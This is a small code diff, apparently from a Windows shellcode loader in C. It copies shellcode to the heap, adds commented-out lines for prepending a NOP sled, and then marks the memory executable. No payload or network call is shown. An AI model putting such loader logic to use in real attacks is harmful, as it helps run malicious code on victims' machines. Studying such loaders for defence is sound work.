@@ -28,6 +28,9 @@ int main(int argc, char *argv[]) {
 
     //Copying shellcode to heap
     memcpy(exec, s, memory_allocation);
+    // to accomodate nop gen NOPS.
+    // memcpy(exec, nopss, memory_allocation);
+    // memcpy(exec + sizeof(nopss), s, memory_allocation);
     DWORD ignore;
 
     //Changing memory permissions to X for shellcode execution
